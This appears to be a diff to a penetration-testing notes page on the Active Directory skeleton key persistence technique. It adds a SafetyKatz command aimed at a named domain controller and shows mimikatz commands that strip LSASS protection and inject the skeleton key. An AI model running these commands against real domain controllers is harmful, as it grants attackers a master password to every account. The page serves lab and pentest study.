@@ -14,6 +14,8 @@ Skeleton key is a persistence technique where it is possible to inject malware t
 # needs DA privs
 # password would be "mimikatz"
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' 
+# or with safetykatz
+SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
 
 ## Access any machine
@@ -33,7 +35,5 @@ mimikatz # !processprotect /process:lsass.exe /remove
 mimikatz # misc::skeleton
 mimikatz # !-
 ```
-
-more detailed
 
 {% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/persistence/skeleton-key-attack" %}
